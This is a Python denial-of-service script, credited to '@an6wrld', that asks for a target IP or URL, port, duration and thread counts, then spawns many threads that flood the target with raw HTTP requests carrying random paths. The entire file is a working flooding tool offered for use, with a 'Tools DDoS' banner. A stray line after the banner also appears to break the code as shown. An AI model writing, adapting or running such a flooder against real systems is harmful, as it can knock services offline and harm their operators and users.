# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    print(f"{Fore.LIGHTRED_EX}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
    rps = 0
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()

#DATA
banner = f"""
{Fore.LIGHTRED_EX}



░█████╗░  ███╗░░██╗  ░█████╗░  ░██╗░░░░░░░██╗  ██████╗░  ██╗░░░░░  ██████╗░
██╔══██╗  ████╗░██║  ██╔═══╝░  ░██║░░██╗░░██║  ██╔══██╗  ██║░░░░░  ██╔══██╗
███████║  ██╔██╗██║  ██████╗░  ░╚██╗████╗██╔╝  ██████╔╝  ██║░░░░░  ██║░░██║
██╔══██║  ██║╚████║  ██╔══██╗  ░░████╔═████║░  ██╔══██╗  ██║░░░░░  ██║░░██║
██║░░██║  ██║░╚███║  ╚█████╔╝  ░░╚██╔╝░╚██╔╝░  ██║░░██║  ███████╗  ██████╔╝
╚═╝░░╚═╝  ╚═╝░░╚══╝  ░╚════╝░  ░░░╚═╝░░░╚═╝░░  ╚═╝░░╚═╝  ╚══════╝  ╚═════╝░

WELCOME TO US
  
Channel YT : @an6wrld
Team Members : None
WebSite : Coming Soon
Tools DDoS by @an6wrld


{Fore.RESET}"""
{Fore.YELLOW}

print(banner)
host = ""
ip = ""
target_loader = input(f"{Fore.WHITE}IP / URL : ")
port_loader = int(input(f"{Fore.WHITE}PORT : "))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME"+Fore.WHITE+" - Default 250 : "))
spam_loader = int(input(f"{Fore.LIGHTRED_EX}SPAM THREAD"+Fore.WHITE+" - Default 50 / 299 : "))
create_thread = int(input(F"{Fore.LIGHTRED_EX}CREATE THREAD"+Fore.WHITE+" - Default 50 : "))
booter_sent = int(input(F"{Fore.LIGHTRED_EX}BOOTER SENT"+Fore.WHITE+" - Default 500 : "))
print(f"{Fore.LIGHTRED_EX}EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
print(f"{Fore.LIGHTRED_EX}EXAMPLE CUSTOM HTTP METHODS > PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTRED_EX}HTTP_METHODS"+Fore.WHITE+" - Gateway / example.com : ")
print(f"{Fore.LIGHTRED_EX}TRYING TO GET IP:PORT {Fore.WHITE} . . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.LIGHTRED_EX}{loader_num} CREATE THREAD"+Fore.WHITE+" . . .{Fore.RESET}")
    sys.stdout.flush()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.LIGHTRED_EX}TRYING SENT. . .{Fore.RESET}")
